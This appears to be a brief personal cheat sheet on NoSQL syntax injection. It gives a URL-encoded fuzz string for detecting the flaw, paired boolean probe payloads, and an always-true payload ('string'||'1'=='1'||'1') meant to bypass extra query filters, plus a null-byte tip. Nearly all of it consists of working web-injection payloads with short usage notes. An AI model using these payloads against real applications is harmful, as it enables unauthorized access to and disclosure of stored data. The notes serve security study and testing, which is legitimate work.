# nosqli
## syntax injection
test string, if output is any different, its prob vulnerable
%27%22%60%7b%0a%3b%24%46%6f%6f%7d%0a%24%46%6f%6f%20%5c%78%59%5a

payload 1:
` ' && 0 && 'x `
payload 2:
` ' && 1 && 'x `


if output different, its vulnerable.


sqli "or 1=1; equivalent:
` string'||'1'=='1 `
will evaluate to this.category = 'string'||'1'=='1'

this payload is useful
` string'||'1'=='1'||'1 `
as, if theres any checks for more properties / filters, this will still always evaluate to true
as, literally anything|| true || true && literally anything; will always evaluate to true.

`%00` occasionally works too as a null character, so trying it isnt a bad idea, dont expect anything though.








